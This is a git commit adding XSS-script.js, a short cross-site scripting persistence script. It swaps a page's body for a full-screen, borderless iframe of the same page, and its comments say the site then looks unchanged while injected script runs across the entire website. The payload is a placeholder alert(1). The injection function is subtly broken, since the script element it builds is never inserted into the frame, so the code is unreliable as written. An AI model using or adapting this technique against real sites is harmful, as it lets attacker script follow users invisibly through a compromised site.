f6a7837e31681c3d8db4ded2090648e84b22572c
rekcah-eht <77259089+rekcah-eht@users.noreply.github.com>
2021-01-11 13:48:26 +0900

    Create XSS-script.js

---
+++ XSS-script.js
@@ -0,0 +1,9 @@
+function inject_js(){
+    var frame_document = document.getElementById('iframe').contentWindow.document
+    var script_tag = frame_document.createElement('script');
+    script_tag.innerHTML = "alert(1);" // <- this is the script that will be injected to entire website
+}
+
+iframe_tag = '<iframe src="'+ location.href+ '" style="display:block; width:100vw; height: 100vh; border: none" id="iframe" onload="inject_js()"></iframe>';
+
+document.getElementsByTagName('body')[0].innerHTML = iframe_tag // the website looks completely same as before
